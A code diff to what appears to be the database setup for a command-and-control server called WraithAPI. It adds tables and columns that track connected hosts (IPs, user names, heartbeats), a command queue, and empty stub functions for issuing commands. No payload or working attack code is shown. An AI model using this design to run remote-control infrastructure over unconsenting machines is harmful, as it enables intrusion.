@@ -29,7 +29,8 @@ try {
             `WraithSwitchCryptKey` TEXT,
             `ServerFingerprint` TEXT,
             `DefaultCommand` TEXT,
-            `APIPrefix` TEXT
+            `APIPrefix` TEXT,
+            `RequestIPBlacklist` TEXT
         );",
         // Statistics table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_Stats` (
@@ -42,7 +43,7 @@ try {
             `CommandsExecuted` INTEGER
         );",
         // Connected Wraiths table
-        "CREATE TABLE IF NOT EXISTS `WraithAPI_Wraiths` (
+        "CREATE TABLE IF NOT EXISTS `WraithAPI_ActiveWraiths` (
             `AssignedID` TEXT NOT NULL UNIQUE,
             `Fingerprint` TEXT,
             `ReportedIP` TEXT,
@@ -52,10 +53,12 @@ try {
             `HostUserName` TEXT,
             `WraithVersion` TEXT,
             `HeartbeatsReceived` INTEGER,
-            `LastHeartbeatTime` INTEGER NOT NULL
+            `LastHeartbeatTime` INTEGER NOT NULL,
+            `IssuedCommands` TEXT
+
         );",
         // Command queue table
-        "CREATE TABLE IF NOT EXISTS `WraithAPI_Commands` (
+        "CREATE TABLE IF NOT EXISTS `WraithAPI_CommandsIssued` (
             `CommandID` TEXT NOT NULL UNIQUE,
             `CommandName` TEXT,
             `CommandParams` TEXT,
@@ -154,5 +157,28 @@ try {
 
 // Functions for database management
 
+// Add a Wraith to the database
+function db_add_wraith() {
+    // TODO
+}
+
 // Check which Wraiths have not sent a heartbeat in the mark dead time and remove
 // them from the database
+function db_expire_wraiths() {
+    // TODO
+}
+
+// Get a list of Wraiths and their properties
+function db_get_wraiths() {
+    // TODO
+}
+
+// Issue a command to Wraith(s)
+function db_issue_command() {
+    // TODO
+}
+
+// Edit an API setting
+function db_edit_setting() {
+    // TODO
+}
